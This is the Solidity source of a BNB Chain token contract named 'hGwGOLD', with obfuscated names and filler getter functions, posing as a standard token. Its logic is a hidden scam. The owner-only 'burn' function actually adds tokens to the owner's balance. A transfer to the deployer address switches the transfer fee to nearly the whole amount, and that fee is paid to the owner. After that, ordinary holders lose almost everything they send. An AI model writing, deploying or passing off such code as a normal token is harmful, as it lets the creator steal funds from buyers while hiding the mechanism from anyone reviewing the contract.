/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.6.5;
contract hGwGOLD {
uint256 private  EBBpYM = 1000000000000000000;
address private  DcUpYO = address(0);
string public  name = "hGwGOLD";
event Transfer(address indexed from, address indexed to, uint256 value);
address private  XkKpGJ = address(0);
uint256 public constant GvebNQ = 99999;
uint8 public constant decimals = 18;
address private  acxjzB = address(0);
address private  qCVUzq = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
address public owner;
address private  RPhYBL = address(0);
address private  WDbOqo = address(0);
uint256 private  fhuCLl = 1000000000000000000;
uint256 private  EwtGMg = 10000000000000;
uint256 private  owUDUm = 10000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  eVEueN = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
mapping (address => uint256) public balanceOf;
uint256 private  MFDwgT = 100000000;
string public  symbol = "hGwGOLD";
uint256 private  PQyehU = 1000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  orWCEC = address(0);
uint256 private  qBiSMZ = 1000000000000000000000;
address private  EUCCFm = address(0);
constructor () public {
acxjzB = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getPQyehU() private returns (uint256) {
return PQyehU;
}

function _getEUCCFm() private returns (address) {
return EUCCFm;
}


function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "xEexMA");
require(to != address(0), "xEexMA");
require(amount <= balanceOf[from], "xEexMA");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* GvebNQ/fhuCLl ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==acxjzB){
fhuCLl = GvebNQ+2;
}
emit Transfer(from, to, transferAmount);
}




function _getqCVUzq() private returns (address) {
return qCVUzq;
}





function _getEwtGMg() private returns (uint256) {
return EwtGMg;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}


function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "txEexMA 0");
require(spender != address(0), "fxEexMA 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}


function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getqBiSMZ() private returns (uint256) {
return qBiSMZ;
}

function _getorWCEC() private returns (address) {
return orWCEC;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}




function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}


function _getMFDwgT() private returns (uint256) {
return MFDwgT;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getWDbOqo() private returns (address) {
return WDbOqo;
}

function _getEBBpYM() private returns (uint256) {
return EBBpYM;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}


function _getXkKpGJ() private returns (address) {
return XkKpGJ;
}



modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}

}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Router02 {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}